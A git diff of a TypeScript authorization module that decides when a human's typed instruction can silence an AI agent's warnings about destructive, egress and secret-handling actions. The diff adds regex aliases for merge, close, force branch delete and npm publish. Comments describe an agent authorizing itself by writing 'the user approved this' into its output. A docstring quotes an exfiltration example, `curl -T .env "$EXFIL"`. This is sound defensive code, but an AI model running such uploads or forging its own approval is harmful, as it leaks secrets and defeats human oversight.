@@ -1,11 +1,11 @@
 // bridge/src/handler/authorization.ts
 
-// Instruction-scoped authorization (§5.4). A lift is derived ONLY from the text a
+// Instruction-scoped authorization. A lift is derived ONLY from the text a
 // human typed into `handler:instruct` — the PA bar and the preset chips both funnel
 // through `HandlerEngine.instruct`, and that method is the single feed point. Never
 // the transcript, never judge/Assistant output: those are attacker-influenced, and an
 // agent that could authorize itself by writing "the user approved this" into its own
-// output would turn the advisory floor (§5.1) into decoration.
+// output would turn the advisory floor into decoration.
 //
 // Two grades, because "the user named this operation" and "the user named this
 // target" are different claims:
@@ -13,7 +13,7 @@
 //   literal lift — ABS_PATH and egress hosts, keyed by the exact string. Naming one
 //                  path outside the project must not open the filesystem; naming one
 //                  host must not open the network.
-// HARD (§5.3) is liftable by nothing at all.
+// HARD is liftable by nothing at all.
 
 import { classifyDestructive, isInsideProject, type FloorWarning } from "./destructive-floor";
 
@@ -28,7 +28,7 @@ export interface InstructionAuthorization {
 
 /**
  * The floor tiers a PATTERN lift can silence. ABS_PATH takes a literal lift
- * instead (`paths`), and §5.3 HARD takes none at all.
+ * instead (`paths`), and HARD takes none at all.
  */
 export type LiftedTier = "DESTRUCTIVE" | "EGRESS" | "SECRETS";
 
@@ -82,8 +82,14 @@ interface Alias {
 // The floor's patterns are COMMAND-shaped and an instruction is natural language, so
 // scanning "force push branch" with the floor regexes matches nothing — a lift derived
 // from that scan alone would be dead code that still passes its own tests. This table
-// closes the gap for the four operations §5.2 can actually prepare a snapshot for,
-// which are also the ones a user routinely names in prose.
+// closes the gap for the floor operations a user routinely names in prose.
+//
+// That deliberately reaches past the operations snapshot.ts can prepare a snapshot for,
+// to the outward ones (a merge, a publish, a force branch delete) that nothing can.
+// Without a row here their advisory recurs every pass and buildDecidePrompt feeds it
+// back as a reason to escalate, so the merge the backlog exists to land never lands. A
+// lift there buys silence on the advisory and nothing else — never an undo, because
+// none exists.
 //
 // It stays narrow and demands specific phrasing, because the two failure directions are
 // not symmetric: a MISSING lift costs one advisory row in the activity feed, while a
@@ -98,12 +104,20 @@ interface Alias {
 // product-development vocabulary: "add a hard reset button to the settings screen",
 // "add a force delete confirmation dialog", "recursively delete stale LRU entries".
 // None of those asks for anything to happen to the repo or the disk, and a lift
-// granted from one silently suppresses every §5.1 advisory row for the rest of the
+// granted from one silently suppresses every advisory row for the rest of the
 // session — the failure this table is least able to afford.
 const REPO_ANCHOR = String.raw`\b(?:git|repo|repository|branch|commit|HEAD|origin|upstream|working\s+tree)\b`;
 // No "cache" — "force remove the row from the cache" is in-memory prose, and the
 // filesystem sense always spells itself "cache dir"/"cache directory" anyway.
 const FS_ANCHOR = String.raw`\b(?:dirs?|directory|directories|folders?|files?|node_modules|build|dist|out|target|coverage|vendor|artifacts?)\b`;
+// A bare `#\d+` is NOT an arm: GitHub numbers issues and pull requests in one series
+// and "closes #42" is the standard idiom for an ISSUE, so anchoring on the number alone
+// grants `gh pr close`/`gh pr merge` from the single most common line in a backlog.
+// `PR #42` still anchors — on the `PR`.
+const PR_ANCHOR = String.raw`(?:\bPRs?\b|\bpull\s+requests?\b)`;
+// Its own anchor rather than REPO_ANCHOR, which also accepts git/repo/commit — "delete
+// the old git config files" would otherwise grant a force branch delete.
+const BRANCH_ANCHOR = String.raw`\bbranch(?:es)?\b`;
 
 /** An anchored phrase, in either order — prose puts the anchor on either side. */
 function anchored(phrase: string, anchor: string, gap = 40): RegExp[] {
@@ -148,6 +162,48 @@ const ALIASES: Alias[] = [
     ],
     command: "git clean -fd",
   },
+  {
+    phrases: [
+      // Not before `conflict`: "fix the merge conflicts on PR #12" is the most common
+      // sentence in a backlog carrying both the verb and the anchor, and it asks for the
+      // opposite of a merge — the PR is not ready to land.
+      ...anchored(
+        String.raw`\b(?:squash[\s-]?|rebase[\s-]?)?merg(?:e|es|ed|ing)\b(?!\s*conflicts?\b)`,
+        PR_ANCHOR,
+      ),
+      /\bgh\s+pr\s+merge\b/i,
+    ],
+    command: "gh pr merge 1",
+  },
+  {
+    phrases: [
+      ...anchored(String.raw`\bclos(?:e|es|ed|ing)\b`, PR_ANCHOR),
+      /\bgh\s+pr\s+close\b/i,
+    ],
+    command: "gh pr close 1",
+  },
+  {
+    // FORCE phrasing only. Plain "delete the branch after merging" is the prose for
+    // `git branch -d`, which the floor does not flag at all, so lifting the forced
+    // spelling from it would be exactly the spurious grant this table cannot afford.
+    // The literal arm is case-sensitive for the same reason the floor pattern is.
+    phrases: [
+      ...anchored(String.raw`\bforce[\s-]?delet(?:e|es|ed|ing)\b`, BRANCH_ANCHOR),
+      /\bgit\s+branch\s+-D\b/,
+    ],
+    command: "git branch -D topic",
+  },
+  {
+    phrases: [
+      /\bnpm\s+publish\b/i,
+      /\bpublish(?:es|ed|ing)?\b[^\n]{0,24}\b(?:to\s+)?npm\b/i,
+    ],
+    command: "npm publish",
+  },
+  // No prose alias for `gh release delete`, `gh repo delete` or `git tag -d`: the
+  // English for each is arguable ("delete the release notes", "drop the old tags"),
+  // and a user who types the literal command in the PA bar is already lifted by the
+  // floor-scan half of authorizeInstruction.
 ];
 
 // ABS_PATH is excluded rather than incidentally absent: an alias grants an operation,
@@ -179,11 +235,11 @@ function normalizeHost(h: string): string {
   return h.split("@").pop()!.replace(/:\d+$/, "").replace(/\.$/, "").toLowerCase();
 }
 
+// Built ON destinationsIn rather than beside it, so "the subset" below stays a
+// fact about the code and not a claim two lists have to keep agreeing on.
 function hostsIn(text: string): Set<string> {
-  const out = new Set<string>();
-  for (const m of text.matchAll(URL_AUTHORITY)) out.add(normalizeHost(m[1]!));
+  const out = destinationsIn(text);
   for (const m of text.matchAll(BARE_HOST)) out.add(normalizeHost(m[1]!));
-  for (const m of text.matchAll(IPV4)) out.add(m[0]!);
   return out;
 }
 
@@ -268,14 +324,17 @@ export function authorizeInstruction(
   // Every grant below reads the PERMITTED clauses, never the raw text: a prohibition
   // names the same command a request does, and only the polarity tells them apart.
   const asked = grantableClauses(text);
-  // floor.hard is ignored, not consulted: §5.3 has no lift, so naming one of those
+  // floor.hard is ignored, not consulted: HARD has no lift, so naming one of those
   // commands in an instruction must leave no trace here.
   const floor = classifyDestructive(asked, projectPath);
   const operations: LiftedOperation[] = [];
   const seen = new Set<string>();
   const note = (tier: LiftedTier, matched: string) => {
-    if (seen.has(`${tier} ${matched}`)) return;
-    seen.add(`${tier} ${matched}`);
+    // Injective without a separator byte either field could contain — the same rule
+    // destructive-floor.ts states for its own warning key.
+    const key = JSON.stringify([tier, matched]);
+    if (seen.has(key)) return;
+    seen.add(key);
     operations.push({ tier, matched });
   };
   for (const w of floor.warnings) {
@@ -336,9 +395,9 @@ function namesTargetOutsideProject(flaggedText: string, projectPath: string): bo
  *
  * The egress target claim fails CLOSED. An upload whose destination cannot be resolved
  * to a literal — `curl -T .env "$EXFIL"` — has named no host the user could have
- * authorized, so the operation lift does not stand on its own: §5.4 exists precisely so
- * that naming one host does not open the network, and an unparseable destination is the
- * one the user is least likely to have meant.
+ * authorized, so the operation lift does not stand on its own: the host lift is
+ * literal precisely so that naming one host does not open the network, and an
+ * unparseable destination is the one the user is least likely to have meant.
  */
 export function isAuthorized(
   auth: InstructionAuthorization, w: FloorWarning, flaggedText: string, projectPath: string,
@@ -366,8 +425,8 @@ export function isAuthorized(
 
 /**
  * Split rather than filter. An authorized action carries no warning — the user already
- * said to do it — but it is still snapshotted (§5.4), so the authorized list has to
- * survive the call site for the §5.2 snapshot pass to read.
+ * said to do it — but it is still snapshotted, so the authorized list has to
+ * survive the call site for the snapshot pass to read.
  */
 export function partitionWarnings(
   auth: InstructionAuthorization, warnings: FloorWarning[], flaggedText: string,
